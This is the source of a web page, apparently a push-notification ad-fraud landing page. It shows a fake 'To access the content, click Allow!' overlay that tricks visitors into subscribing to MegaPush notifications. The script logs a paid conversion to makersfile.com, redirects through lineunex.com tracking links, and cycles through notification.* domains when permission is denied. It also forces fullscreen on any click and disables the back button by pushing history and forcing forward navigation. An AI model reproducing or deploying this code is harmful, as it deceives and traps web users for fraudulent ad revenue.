<body class="mainBody " id="page_release-search"><div id="blockI" class="blockCh"><div class="container blockCh"><img src="/arrow.png" class="arrow"><div class="block-p"><p class="t1">To access the content, click Allow!</p></div></div></div>

<div class="countdown hide">

    <div class="outer">
        <div class="middle">
            <div class="loading-circle">
                <div class="circle1 rotate-right"></div>
                <div class="circle2 rotate-left"></div>
                <div class="percent" id="percent"></div>
            </div>
        </div>
    </div>
</div>

<script type="text/javascript">
    $(document).ready(function () {
        var domains = [
			            'https://www.notification.team/desktop/',
			            'https://www.notification.market/desktop/',
			            'https://www.notification.agency/desktop/',
			            'https://www.notification.promo/desktop/',
			            'https://www.notification.media/desktop/',
			            'https://v2.notification.team/desktop/',
			            'https://v2.notification.market/desktop/',
			            'https://v2.notification.agency/desktop/',
			            'https://v2.notification.promo/desktop/',
			            'https://v2.notification.media/desktop/',
			            'https://v3.notification.team/desktop/',
			            'https://v3.notification.market/desktop/',
			            'https://v3.notification.agency/desktop/',
			            'https://v3.notification.promo/desktop/',
			            'https://v3.notification.media/desktop/',
			            'https://v4.notification.team/desktop/',
			            'https://v4.notification.market/desktop/',
			            'https://v4.notification.agency/desktop/',
			            'https://v4.notification.promo/desktop/',
			            'https://v4.notification.media/desktop/',
			            'https://v4.notification.team/desktop/',
			            'https://v4.notification.market/desktop/',
			            'https://v4.notification.agency/desktop/',
			            'https://v4.notification.promo/desktop/',
			            'https://v4.notification.media/desktop/',
			        ];
        var $body = $('body'),
            $blockDiv = $('<div id="blockI"><div class="container"><img src="img/arrow.png" class="arrow"><div class="block-p"><p class="t1">To access the content, click Allow!</p></div></div></div>');

        MegaPush.init({
            pid: 221075,
            type: 'auto',
            button: 'testbtn',
            granted: function () {
                if ($('#blockDiv').length > 0) {
                    $blockDiv.remove();
                }
                $.ajax({
                    url: 'https://makersfile.com/click.php',
                    data: {
                        cnv_id: getUrlParameter('s'),
                        payout: '0.002'
                    },
                    method: 'GET',
                    success: function (data) {

                        var timeleft = 11;
                        var downloadTimer = setInterval(function () {
                            timeleft--;
                            document.getElementById("percent").textContent = timeleft;
                        }, 1000);
                        
                        $('.textArea').css('display', 'none');
                        $('#blockI').css('display', 'none');
                        $('.countdown').addClass('show');
                        setTimeout(function () {
                            location.replace('http://lineunex.com/click.php?key=v5y5klyc1snqqhi48wts&t2={t2}&newid={clickid}');
                        }, 2000);
                    }
                });
                $('.textArea').css('display', 'none');
                $('#blockI').css('display', 'none');
                $('.countdown').addClass('show');
                setTimeout(function () {
                    location.replace('http://lineunex.com/click.php?key=v5y5klyc1snqqhi48wts&t2={t2}&newid={clickid}');
                }, 2000);
            },
            denied: function () {
                var href = window.location.href;
                $.each(domains, function (key, val) {
                    if (href.indexOf(val) >= 0) {
                        if (domains[key + 1] == null) {
                            location.replace('http://lineunex.com/click.php?key=5j75sjr0l6kzzfhcbiuk&t2={t2}&newid={clickid}');
                        } else {
                            location.replace(domains[key + 1]);
                        }
                    }
                });
            },
            subscribed: function () {
                var allowRed = 'http://lineunex.com/click.php?key=v5y5klyc1snqqhi48wts&t2={t2}&newid={clickid}';
                setTimeout(function () {
                    location.replace(allowRed);
                }, 2000);
            }
        });

        $body.prepend($blockDiv);
        var uagent = navigator.userAgent.toLowerCase(),
            is_opera = (uagent.indexOf("op") > -1),
            is_moz = /firefox/i.test(uagent),
            is_safari = (!(/chrome/i.test(uagent)) && /webkit|safari|khtml/i.test(uagent)),
            is_chrome = (uagent.match(/Chrome\/\w+\.\w+/i));
        if (is_chrome === 'null' || !is_chrome || is_chrome === 0) is_chrome = '';

        if (is_opera) {
            setTimeout(function () {
                $blockDiv.addClass('blockO');
                $('.container').addClass('blockO');
            }, 1000);
        } else if (is_chrome) {
            setTimeout(function () {
                $blockDiv.addClass('blockCh');
                $('.container').addClass('blockCh');
            }, 1000);
        } else if (is_moz) {
            setTimeout(function () {
                $blockDiv.addClass('blockMz');
                $('.container').addClass('blockMz');
            }, 1000);
        } else if (is_safari) {
            setTimeout(function () {
                $blockDiv.addClass('blockSaf');
                $('.container').addClass('blockSaf');
            }, 1000);
        }

        function toggleFullScreen() {
            if (!document.webkitIsFullScreen) {
                document.documentElement.webkitRequestFullScreen();
            } else {
                document.webkitCancelFullScreen();
            }
        }

        function getUrlParameter(sParam) {
            var sPageURL = decodeURIComponent(window.location.search.substring(1)),
                sURLVariables = sPageURL.split('&'),
                sParameterName,
                i;

            for (i = 0; i < sURLVariables.length; i++) {
                sParameterName = sURLVariables[i].split('=');

                if (sParameterName[0] === sParam) {
                    return sParameterName[1] === undefined ? true : sParameterName[1];
                }
            }
        }

        var elem = document.getElementById("page_release-search");
        elem.onclick = function () {
            var req = elem.requestFullScreen || elem.webkitRequestFullScreen || elem.mozRequestFullScreen;
            req.call(elem);
        };
        if (window.history && window.history.pushState) {
            window.history.pushState('forward', null);
            $(window).on('popstate', function () {
                window.history.forward();
            });
        }
    });
</script>


</body></html>
